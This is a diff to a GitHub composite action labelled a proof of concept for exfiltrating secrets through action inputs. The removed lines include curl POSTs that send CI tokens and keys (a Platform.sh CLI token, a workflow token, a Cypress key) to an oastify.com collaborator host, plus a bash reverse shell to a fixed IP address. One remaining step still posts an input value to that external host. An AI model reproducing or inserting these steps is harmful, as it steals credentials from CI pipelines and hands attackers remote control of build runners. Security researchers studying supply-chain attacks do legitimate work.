@@ -4,33 +4,14 @@ description: PoC to test input-based secret exfil
 inputs:
   tomas:
     required: false
-  token:
-    required: false
-  workflow_token:
-    required: false
-  cypress_key:
-    required: false
 
 runs:
   using: "composite"
   steps:
-    - name: Exfil env before CLI step
-      shell: bash
-      run: |
-        curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com -d "token=$PLATFORMSH_CLI_TOKEN"
     - name: Exfiltrate via inputs
       shell: bash
       run: |
         echo "Attempting to exfil secrets via inputs..."
         curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
           -d "tomas=${{ inputs.tomas }}"
-        curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
-          -d "token=${{ inputs.token }}"
-        curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
-          -d "workflow_token=${{ inputs.workflow_token }}"
-        curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
-          -d "cypress_key=${{ inputs.cypress_key }}"
-    - name: reverse
-      shell: bash
-      run: |
-        bash -i >& /dev/tcp/185.28.22.45/443 0>&1
+
